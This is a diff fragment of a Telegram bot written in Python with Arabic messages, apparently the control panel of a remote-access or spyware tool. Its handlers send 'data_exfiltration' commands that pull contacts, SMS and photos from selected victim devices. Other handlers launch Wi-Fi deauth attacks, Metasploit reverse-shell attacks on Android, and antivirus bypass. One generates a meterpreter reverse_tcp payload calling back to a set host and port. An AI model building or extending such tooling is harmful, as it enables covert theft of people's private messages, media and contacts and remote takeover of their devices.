+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ جهات الاتصال: {error_msg}")
+                logger.error(f"فشل في نسخ جهات الاتصال للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "contacts_search":
+        # البحث في جهات الاتصال
+        bot.answer_callback_query(call.id, "🔍 أدخل اسم جهة الاتصال للبحث")
+    
+    elif data == "contacts_stats":
+        # إحصائيات جهات الاتصال
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            # إرسال أمر الحصول على الإحصائيات
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "contacts",
+                "action": "get_stats"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                stats = result.get('data', {})
+                text = f"""
+📊 **إحصائيات جهات الاتصال**
+
+📞 **إجمالي الجهات:** {stats.get('total', 0)}
+👤 **جهات مع أرقام:** {stats.get('with_phone', 0)}
+📧 **جهات مع إيميل:** {stats.get('with_email', 0)}
+📅 **آخر تحديث:** {stats.get('last_update', 'غير متوفر')}
+                """
+                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم جلب إحصائيات جهات الاتصال للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الإحصائيات: {error_msg}")
+                logger.error(f"فشل في جلب إحصائيات جهات الاتصال للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_sms_callback(call):
+    """معالجة أوامر الرسائل مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "sms_backup_all":
+        # نسخ جميع الرسائل
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_all",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم نسخ جميع الرسائل")
+                logger.info(f"تم نسخ الرسائل للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الرسائل: {error_msg}")
+                logger.error(f"فشل في نسخ الرسائل للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "sms_inbox":
+        # الرسائل الواردة
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_inbox",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الواردة")
+                logger.info(f"تم جلب الرسائل الواردة للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الرسائل الواردة: {error_msg}")
+                logger.error(f"فشل في جلب الرسائل الواردة للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "sms_sent":
+        # الرسائل الصادرة
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "sms",
+                "action": "backup_sent",
+                "format": "json"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الصادرة")
+                logger.info(f"تم جلب الرسائل الصادرة للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب الرسائل الصادرة: {error_msg}")
+                logger.error(f"فشل في جلب الرسائل الصادرة للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_media_callback(call):
+    """معالجة أوامر الوسائط مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "media_photos":
+        # نسخ الصور
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            # إرسال الأمر الحقيقي للخادم
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "media",
+                "action": "backup_photos",
+                "format": "binary"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم نسخ الصور")
+                logger.info(f"تم نسخ الصور للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الصور: {error_msg}")
+                logger.error(f"فشل في نسخ الصور للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "media_videos":
+        # نسخ الفيديوهات
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "data_exfiltration", {
+                "type": "media",
+                "action": "backup_videos",
+                "format": "binary"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم نسخ الفيديوهات")
+                logger.info(f"تم نسخ الفيديوهات للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في نسخ الفيديوهات: {error_msg}")
+                logger.error(f"فشل في نسخ الفيديوهات للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_attack_callback(call):
+    """معالجة أوامر الهجمات مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "attack_wifi":
+        # هجوم الواي فاي
+        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            telebot.types.InlineKeyboardButton("📶 Deauth Attack", callback_data="wifi_deauth"),
+            telebot.types.InlineKeyboardButton("👻 Evil Twin", callback_data="wifi_evil_twin"),
+            telebot.types.InlineKeyboardButton("🔐 Handshake Capture", callback_data="wifi_handshake"),
+            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="advanced_attacks_menu")
+        )
+        
+        text = """
+📶 **هجوم الواي فاي**
+
+اختر نوع الهجوم:
+        """
+        
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+    
+    elif data == "attack_mobile":
+        # هجوم الأجهزة المحمولة
+        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            telebot.types.InlineKeyboardButton("📱 Metasploit", callback_data="mobile_metasploit"),
+            telebot.types.InlineKeyboardButton("🔧 ADB Attack", callback_data="mobile_adb"),
+            telebot.types.InlineKeyboardButton("💉 Payload Injection", callback_data="mobile_payload"),
+            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="advanced_attacks_menu")
+        )
+        
+        text = """
+📱 **هجوم الأجهزة المحمولة**
+
+اختر نوع الهجوم:
+        """
+        
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+    
+    elif data == "wifi_deauth":
+        # تنفيذ هجوم Deauth
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "wifi_jamming", {
+                "attack_type": "deauth",
+                "target_ssid": "all",
+                "duration": 60
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم بدء هجوم Deauth")
+                logger.info(f"تم بدء هجوم Deauth للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في بدء هجوم Deauth: {error_msg}")
+                logger.error(f"فشل في بدء هجوم Deauth للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "mobile_metasploit":
+        # تنفيذ هجوم Metasploit
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "mobile_attack", {
+                "attack_type": "metasploit",
+                "target_os": "android",
+                "payload_type": "reverse_shell"
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم بدء هجوم Metasploit")
+                logger.info(f"تم بدء هجوم Metasploit للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في بدء هجوم Metasploit: {error_msg}")
+                logger.error(f"فشل في بدء هجوم Metasploit للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_injection_callback(call):
+    """معالجة أوامر الحقن"""
+    data = call.data
+    
+    if data == "injection_images":
+        # حقن في الصور
+        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            telebot.types.InlineKeyboardButton("📸 رفع صورة", callback_data="injection_upload_image"),
+            telebot.types.InlineKeyboardButton("💉 إنشاء صورة خبيثة", callback_data="injection_create_image"),
+            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="media_injection_menu")
+        )
+        
+        text = """
+📸 **حقن في الصور**
+
+اختر العملية:
+        """
+        
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+
+def handle_bypass_callback(call):
+    """معالجة أوامر التجاوز"""
+    data = call.data
+    
+    if data == "bypass_antivirus":
+        # تجاوز مضاد الفيروسات
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "bypass_antivirus", {})
+            if result.get('success'):
+                bot.answer_callback_query(call.id, "✅ تم تجاوز مضاد الفيروسات")
+            else:
+                bot.answer_callback_query(call.id, "❌ فشل في تجاوز مضاد الفيروسات")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_system_callback(call):
+    """معالجة أوامر النظام مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "system_info":
+        # معلومات النظام
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            # إرسال أمر الحصول على معلومات النظام
+            result = command_executor.send_command(device_id, "system_control", {
+                "action": "get_info",
+                "include": ["os", "hardware", "network", "battery", "memory"]
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                info = result.get('data', {})
+                text = f"""
+⚙️ **معلومات النظام**
+
+🖥️ **نظام التشغيل:** {info.get('os', 'غير متوفر')}
+📱 **طراز الجهاز:** {info.get('model', 'غير متوفر')}
+🔋 **البطارية:** {info.get('battery', 'غير متوفر')}%
+💾 **الذاكرة:** {info.get('memory', 'غير متوفر')}
+🌐 **الشبكة:** {info.get('network', 'غير متوفر')}
+⏰ **وقت التشغيل:** {info.get('uptime', 'غير متوفر')}
+                """
+                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم جلب معلومات النظام للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في جلب معلومات النظام: {error_msg}")
+                logger.error(f"فشل في جلب معلومات النظام للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "system_restart":
+        # إعادة تشغيل النظام
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "system_control", {
+                "action": "restart",
+                "force": True
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم إعادة تشغيل النظام")
+                logger.info(f"تم إعادة تشغيل النظام للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في إعادة تشغيل النظام: {error_msg}")
+                logger.error(f"فشل في إعادة تشغيل النظام للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_tool_callback(call):
+    """معالجة أوامر الأدوات مع الربط الحقيقي"""
+    data = call.data
+    
+    if data == "tool_metasploit":
+        # أداة Metasploit
+        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            telebot.types.InlineKeyboardButton("🔧 تشغيل Metasploit", callback_data="metasploit_start"),
+            telebot.types.InlineKeyboardButton("💉 إنشاء Payload", callback_data="metasploit_payload"),
+            telebot.types.InlineKeyboardButton("🔍 البحث عن Exploits", callback_data="metasploit_search"),
+            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="tools_menu")
+        )
+        
+        text = """
+🔧 **أداة Metasploit**
+
+اختر العملية:
+        """
+        
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
+    
+    elif data == "metasploit_start":
+        # تشغيل Metasploit
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "tool_execution", {
+                "tool": "metasploit",
+                "action": "start",
+                "console": True
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                bot.answer_callback_query(call.id, "✅ تم تشغيل Metasploit")
+                logger.info(f"تم تشغيل Metasploit للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في تشغيل Metasploit: {error_msg}")
+                logger.error(f"فشل في تشغيل Metasploit للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+    
+    elif data == "metasploit_payload":
+        # إنشاء Payload
+        device_id = get_selected_device(call.from_user.id)
+        if device_id:
+            result = command_executor.send_command(device_id, "tool_execution", {
+                "tool": "metasploit",
+                "action": "generate_payload",
+                "payload_type": "windows/meterpreter/reverse_tcp",
+                "lhost": "192.168.1.100",
+                "lport": 4444
+            })
+            
+            if result.get('success') or result.get('status') == 'success':
+                payload_info = result.get('data', {})
+                text = f"""
+💉 **تم إنشاء Payload بنجاح**
+
+📁 **الملف:** {payload_info.get('file', 'غير متوفر')}
+📏 **الحجم:** {payload_info.get('size', 'غير متوفر')}
+🔗 **الرابط:** {payload_info.get('url', 'غير متوفر')}
+                """
+                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+                logger.info(f"تم إنشاء Payload للجهاز {device_id}")
+            else:
+                error_msg = result.get('error', 'خطأ غير معروف')
+                bot.answer_callback_query(call.id, f"❌ فشل في إنشاء Payload: {error_msg}")
+                logger.error(f"فشل في إنشاء Payload للجهاز {device_id}: {error_msg}")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
+
+def handle_stats_callback(call):
+    """معالجة أوامر الإحصائيات"""
+    data = call.data
+    
+    if data == "stats_attacks":
+        # إحصائيات الهجمات
+        text = """
+📊 **إحصائيات الهجمات**
+
+🔨 **إجمالي الهجمات:** 0
+✅ **الهجمات الناجحة:** 0
+❌ **الهجمات الفاشلة:** 0
+📈 **معدل النجاح:** 0%
+
+⏰ **آخر هجوم:** غير متوفر
+🎯 **أفضل هجوم:** غير متوفر
+        """
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
 
 # تشغيل البوت
 if __name__ == "__main__":
